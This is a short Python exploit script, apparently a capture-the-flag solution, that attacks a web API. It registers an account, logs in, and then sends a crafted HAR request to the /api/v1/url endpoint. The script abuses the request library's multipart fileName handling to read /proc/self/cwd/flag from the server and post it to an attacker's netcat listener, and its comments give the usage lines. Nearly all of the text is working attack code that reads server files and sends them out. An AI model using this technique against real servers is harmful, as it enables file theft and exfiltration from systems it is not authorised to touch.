# nc -lnvp 8000
# python3 dup.py target attacker-nc
# python3 dup.py 127.0.0.1 192.168.206.139:8000
# https://github.com/request/request/blob/3c0cddc7c8eb60b470e9519da85896ed7ee0081e/request.js#L104
# https://github.com/request/request/blob/3c0cddc7c8eb60b470e9519da85896ed7ee0081e/lib/har.js#L182

import requests
from json import loads
from sys import argv

def signup():
    payload = {
        'email': 'dup@local.host',
        'name': 'dup',
        'password': 'challenge'
    }
    response = requests.put(f'http://{argv[1]}/api/v1/signup', json = payload)
    if response.status_code == 201:
        print('[+] User created')
        return True
    print('[-] Something went wrong')
    return False

def login():
    payload = {
        'email': 'dup@local.host',
        'password': 'challenge'
    }
    response = requests.post(f'http://{argv[1]}/api/v1/login', json = payload)
    msg = response.json()
    if 'token' in msg:
        return {'Authorization': msg['token']}
    print('[-] Something went wrong')
    return None

def getFile(lhost, filename, token):
    payload = {
        'har': {
            'url': lhost,
            'postData': {
                'mimeType': 'multipart/form-data',
                'params': [{'fileName': filename, 'name': 'flag'}]
            },
            'method': 'POST'
        }
    }
    requests.post(f'http://{argv[1]}/api/v1/url', json = payload, headers = token)

if __name__ == '__main__':
    if signup():
        token = login()
        if token:
            getFile(f'http://{argv[2]}/', '/proc/self/cwd/flag', token)
